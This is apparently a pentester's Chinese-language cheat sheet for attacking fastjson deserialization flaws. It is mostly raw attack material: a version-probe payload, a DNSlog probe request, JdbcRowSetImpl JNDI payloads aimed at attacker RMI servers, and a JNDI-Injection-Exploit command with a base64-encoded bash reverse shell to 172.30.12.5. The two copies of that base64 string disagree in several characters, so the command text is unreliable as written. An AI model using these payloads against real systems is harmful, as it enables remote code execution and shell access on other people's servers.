* 测试环境  https://github.com/amaz1ngday/fastjson-exp fastjson.war 配合Tomcat
* tool: rw_exp_java_fastjson_log4j_JNDIExploit1.4.rar

# 漏洞验证, bp 发包

fastjson-cnvd_2019_22238

探测 fastjson 版本 payload, post 请求发：

```json
{"@type": "java.lang.AutoCloseable"
```

```sh
# 1. 改POST
POST / HTTP/1.1
# 2. 改application/json
Content-Type: application/json

# 3. body里按下面填
{"x":{"@type":"java.net.Inet4Address","val":"2i9ehz.dnslog.cn"}}
```

使用 web_exp_reverse_shell_fastjson_jndi_JNDI-Injection-Exploit_fast.py

# payload2

```json
{
  "1": {
    "@type": "java.lang.Class",
    "val": "com.sun.rowset.JdbcRowSetImpl"
  },
  "2": {
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "rmi://192.168.1.13:1099/v4v9uh",
    "autoCommit": true
  }
}
```

## “不出⽹”打 fastjson1.2.48

```
POST /login HTTP/1.1
Host: 172.30.12.236:8080
Content-Length: 226
Content-Type: application/json

{
  "a": {
    "@type": "java.lang.Class",
    "val": "com.sun.rowset.JdbcRowSetImpl"
  },
  "b": {
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "rmi://172.30.12.5:1099/g5gz3u",
    "autoCommit": false
  }
}
```

```sh
root@web01:/tmp# java -jar JNDI-Injection-Exploit-1.0.jar -A "172.30.12.5" -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMZAuMTIuNS8yOTk5OSAwPiYx}|{base64,-d}|{bash,-i}"
ADDRESS >> 172.30.12.5
COMMAND >> bash -c {echo,YmFzaCAtasA+JiAVZGV2L3RjcC8xNzIuMzAuMTIuNS8y0Tk50SAwPiYx}|{base64,-d}|{bash,-i}
```

[FastJson1.68&1.80 版本反序列化利用](https://mp.weixin.qq.com/s/0C5Bny9LxRP62lTq3jRrvQ)
[fastjson-BCEL 不出网打法原理分析](https://mp.weixin.qq.com/s/OwuCNHd9dU6sRMTwLnifCw)
